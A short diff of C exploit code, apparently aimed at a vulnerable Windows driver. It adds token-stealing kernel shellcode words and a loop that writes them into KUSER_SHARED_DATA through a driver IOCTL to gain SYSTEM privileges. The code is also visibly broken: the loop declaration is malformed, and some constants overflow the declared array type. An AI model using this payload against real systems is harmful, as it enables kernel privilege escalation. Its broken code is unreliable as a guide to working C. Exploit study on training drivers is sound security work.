@@ -300,9 +300,17 @@ const unsigned char payload[] = {
 
     payload[0] = 0x0000018825048b4865;
     payload[1] = 0x000000B8808B4800;
+    payload[2] = 0x02F09B8B48C38948; 
+    payload[3] = 0x0002F0EB81480000;
+    payload[4] = 0x000002E88B8B4800;
+    payload[5] = 0x8B48E57504F98348;
+    payload[6] = 0xF0E180000003608B;
+    payload[7] = 0x4800000360888948;
+    payload[8] = 0x0000000000C3C031;
 
-
-    SendToDriver(driverHandle,0x0022200B,(void*) &payload[0], (void*) (((unsigned long long) KUSER_SHARED_DATA)+0));
-    SendToDriver(driverHandle,0x0022200B,(void*) &payload[1], (void*) (((unsigned long long) KUSER_SHARED_DATA)+8) );
+    for (int =0,j=0; i < 9;i++,j+=8)
+    {
+        SendToDriver(driverHandle,0x0022200B,(void*) &payload[i], (void*) (((unsigned long long) KUSER_SHARED_DATA)+j));
+    }
     return (void*) KUSER_SHARED_DATA;
 }
